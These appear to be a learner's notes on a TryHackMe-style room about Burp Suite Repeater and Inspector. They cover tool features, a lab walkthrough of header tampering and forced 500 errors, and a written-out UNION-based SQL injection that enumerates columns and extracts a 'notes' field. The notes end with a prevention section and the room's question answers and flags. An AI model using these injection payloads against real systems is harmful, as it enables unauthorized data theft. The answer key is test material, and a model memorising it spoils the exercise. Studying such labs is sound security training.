# **Burp Suite Repeater and Inspector**

## **Overview**

Burp Suite Repeater is one of the most powerful modules in Burp Suite because it allows penetration testers to capture, modify, and resend HTTP requests multiple times. This tool is essential for manually testing web applications, experimenting with payloads, identifying vulnerabilities, and observing how servers respond to manipulated requests.

The Repeater module works closely with the Proxy feature. Requests intercepted through Proxy can be forwarded directly into Repeater, where they can be edited and resent repeatedly without needing to revisit the website manually.

Inspector complements Repeater by providing a cleaner and more organized way to analyze and modify HTTP requests and responses. Instead of manually editing raw HTTP text, users can manipulate headers, cookies, parameters, and request attributes through a structured interface.

## **Key Takeaways**

* Repeater allows repeated testing of HTTP requests against a target server.  
* Requests can be modified before being resent.  
* Responses can be analyzed in multiple formats such as Pretty, Raw, Hex, and Render.  
* Inspector provides a user-friendly breakdown of requests and responses.  
* Burp Suite Repeater is commonly used for:  
  * SQL Injection testing  
  * Authentication testing  
  * Parameter tampering  
  * API testing  
  * Header manipulation  
  * Session testing

## **Purpose of Repeater**

The Repeater module is designed for:

* Manual vulnerability testing  
* Crafting custom payloads  
* Observing application behavior  
* Debugging APIs and web requests  
* Testing authentication mechanisms  
* Exploring hidden functionality

Unlike automated scanners, Repeater provides fine-grained manual control over every request sent to the target.

## **Main Sections of Repeater**

### **Request List**

* Displays all requests currently loaded into Repeater.  
* Multiple requests can be stored and managed simultaneously.

### **Request Controls**

* Includes:  
  * Send button  
  * Cancel button  
  * Request history navigation

### **Request and Response View**

* Main working area.  
* Left side:  
  * Editable request  
* Right side:  
  * Server response

### **Layout Options**

Users can customize how requests and responses are displayed:

* Horizontal view  
* Vertical view  
* Separate tabs

### **Inspector**

Provides a structured breakdown of:

* Headers  
* Cookies  
* Query parameters  
* POST body parameters  
* Request attributes

### **Target Section**

Displays:

* Target IP  
* Domain  
* Port  
* Protocol

## **Sending Requests to Repeater**

Captured requests from Proxy can be sent into Repeater by:

* Right-clicking the request  
* Selecting:  
  * “Send to Repeater”  
* Or using the shortcut:  
  * Ctrl \+ R

Once inside Repeater:

1. Modify the request  
2. Click Send  
3. Analyze the response  
4. Repeat testing as needed

## **Response Display Options**

### **Pretty**

* Default formatted response view  
* Easier to read

### **Raw**

* Shows exact server response  
* No formatting applied

### **Hex**

* Displays byte-level representation  
* Useful for binary data analysis

### **Render**

* Renders the page visually  
* Displays how the page would appear in a browser

## **Inspector Features**

Inspector simplifies request editing by separating request components into categories.

### **Request Attributes**

Allows modification of:

* HTTP method  
* Protocol version  
* Resource path

### **Request Query Parameters**

Displays URL parameters such as:

?id=5

### **Request Body Parameters**

Specific to POST requests.  
 Useful for:

* Form testing  
* API manipulation  
* Authentication testing

### **Request Cookies**

Allows editing session cookies and authentication tokens.

### **Request Headers**

Enables:

* Header addition  
* Header deletion  
* Header modification

### **Response Headers**

Displays headers returned by the server.

## **Additional Information and Facts**

* Repeater is heavily used in bug bounty hunting and penetration testing.  
* It enables precise testing without refreshing the entire application.  
* HTTP/2 requests can also be tested using Repeater.  
* Inspector reduces human error when modifying requests manually.  
* Repeater maintains a history of changes for easy rollback.  
* The Render tab is useful for testing reflected XSS payloads visually.  
* Header manipulation can reveal hidden server behavior and misconfigurations.

## **Common Security Testing Uses**

### **SQL Injection**

Modify parameters to test database vulnerabilities.

### **Authentication Bypass**

Manipulate cookies and session tokens.

### **API Testing**

Send custom JSON or XML payloads.

### **Access Control Testing**

Change user identifiers and roles.

### **Header Manipulation**

Test:

* User-Agent  
* Referer  
* Authorization headers

### **Session Management Testing**

Check how applications handle:

* Expired sessions  
* Invalid tokens  
* Session fixation

## **Important Concepts**

### **Request**

Data sent from client to server.

### **Response**

Data returned by the server.

### **HTTP Headers**

Metadata included in requests and responses.

### **Query Parameters**

Data passed through the URL.

### **POST Body**

Data sent inside POST requests.

## **Practical Advantages of Repeater**

* Faster than repeatedly using a browser  
* Better visibility into raw HTTP traffic  
* Precise payload control  
* Immediate response analysis  
* Useful for both beginners and professionals

---

Which sections gives us a more intuitive control over our requests?  
 Inspector

Which view will populate when sending a request from the Proxy module to Repeater?  
 Request view

Which option allows us to visualize the page as it would appear in a web browser?  
 Render

Which section in Inspector is specific to POST requests?  
 Request Body Parameters

# **Burp Suite Repeater Practical Exploitation**

## **Overview**

Burp Suite Repeater is one of the most effective tools within Burp Suite for manually manipulating and testing HTTP requests. It is especially useful for testing vulnerabilities that require repeated request modifications such as SQL Injection, parameter tampering, authentication bypasses, and server-side validation weaknesses.

In this practical section, Repeater is used to:

* Manipulate HTTP headers  
* Trigger server-side errors  
* Test improper input validation  
* Exploit a Union-Based SQL Injection vulnerability  
* Extract sensitive database information

These exercises demonstrate how small changes to requests can expose major vulnerabilities in poorly secured web applications.

## **Key Takeaways**

* Repeater allows repeated manual testing of web requests.  
* HTTP headers can influence server behavior.  
* Improper validation can lead to server crashes and vulnerabilities.  
* SQL Injection vulnerabilities can expose sensitive database contents.  
* Verbose server errors can significantly help attackers.  
* UNION-based SQL Injection enables database enumeration and data extraction.  
* Information disclosure vulnerabilities often make attacks easier.

## **Header Manipulation Using Repeater**

One of the simplest but most effective uses of Repeater is modifying request headers.

### **Steps Performed**

* Captured a request to:

http://MACHINE\_IP/

* Sent the request to Repeater  
* Added a custom header:

FlagAuthorised: True

### **Purpose**

This test demonstrates:

* How applications may trust client-supplied headers  
* How attackers can manipulate request metadata  
* Why sensitive authorization logic should never rely on user-controlled headers

### **Result**

The server returned a hidden flag after detecting the custom authorization header.

## **Testing Improper Input Validation**

The next exercise involved testing numeric product endpoints such as:

/products/3

### **Objective**

Determine whether the application properly validates numeric input.

### **Testing Process**

* Captured a request to a product endpoint  
* Sent it to Repeater  
* Modified the numeric parameter with extreme or invalid values

### **Observed Behavior**

The application returned:

500 Internal Server Error

### **Security Implications**

This indicates:

* Poor input validation  
* Weak exception handling  
* Potential backend processing flaws

### **Risks**

Attackers may:

* Crash services  
* Reveal internal server information  
* Trigger unexpected application behavior

## **Union-Based SQL Injection Exploitation**

The final challenge demonstrated a real-world SQL Injection attack using Repeater.

### **Vulnerable Endpoint**

/about/2

### **Initial Testing**

An apostrophe was added:

/about/2'

### **Result**

The server responded with:

500 Internal Server Error

This confirmed:

* The endpoint was vulnerable to SQL Injection.

## **Information Disclosure Through Errors**

The response exposed the backend SQL query:

SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id \= 2'

### **Valuable Information Revealed**

* Table name:

people

* Number of selected columns:

5 columns

* Column names already visible:  
  * firstName  
  * lastName  
  * pfpLink  
  * role  
  * bio

This significantly reduced the enumeration effort.

## **Enumerating Database Columns**

A UNION query was used:

/about/0 UNION ALL SELECT column\_name,null,null,null,null FROM information\_schema.columns WHERE table\_name="people"

### **Purpose**

Retrieve column names from the database schema.

### **Problem**

Only the first row appeared.

### **Solution**

Used:

group\_concat()

### **Improved Query**

/about/0 UNION ALL SELECT group\_concat(column\_name),null,null,null,null FROM information\_schema.columns WHERE table\_name="people"

### **Enumerated Columns**

* id  
* firstName  
* lastName  
* pfpLink  
* role  
* shortRole  
* bio  
* notes

## **Extracting Sensitive Data**

The target column was identified as:

notes

### **Final Exploit Query**

0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id \= 1

### **Result**

Sensitive notes belonging to the CEO were extracted successfully.

## **Important SQL Injection Concepts**

### **UNION Injection**

Allows combining results from multiple SELECT queries.

### **information\_schema**

A default database containing:

* Table names  
* Column names  
* Database metadata

### **group\_concat()**

Combines multiple database rows into one string.

### **Error-Based SQL Injection**

Uses verbose error messages to reveal backend information.

## **Security Risks Demonstrated**

### **Information Disclosure**

Verbose SQL errors exposed:

* Table names  
* Query structure  
* Number of columns

### **Improper Validation**

Endpoints failed to sanitize user input.

### **Sensitive Data Exposure**

Attackers could directly retrieve confidential database contents.

### **Trusting Client Input**

Custom headers affected authorization logic.

## **Prevention Techniques**

### **Input Validation**

* Validate numeric inputs strictly  
* Reject malformed parameters

### **Parameterized Queries**

Use prepared statements instead of dynamic SQL.

### **Error Handling**

Avoid exposing backend database errors to users.

### **Least Privilege**

Restrict database permissions for web applications.

### **Secure Header Handling**

Do not rely on user-supplied headers for authorization decisions.

## **Additional Information and Facts**

* Repeater is heavily used during manual penetration testing.  
* SQL Injection remains one of the most dangerous web vulnerabilities.  
* Verbose error messages greatly accelerate exploitation.  
* UNION attacks require matching column counts.  
* group\_concat() is commonly abused in SQLi exploitation.  
* Information disclosure often turns minor flaws into critical vulnerabilities.  
* Manual testing remains essential even with automated scanners.

---

What is the flag you receive?  
 THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}

What is the flag you receive when you cause a 500 error in the endpoint?  
 THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}

What is the flag?  
 THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}

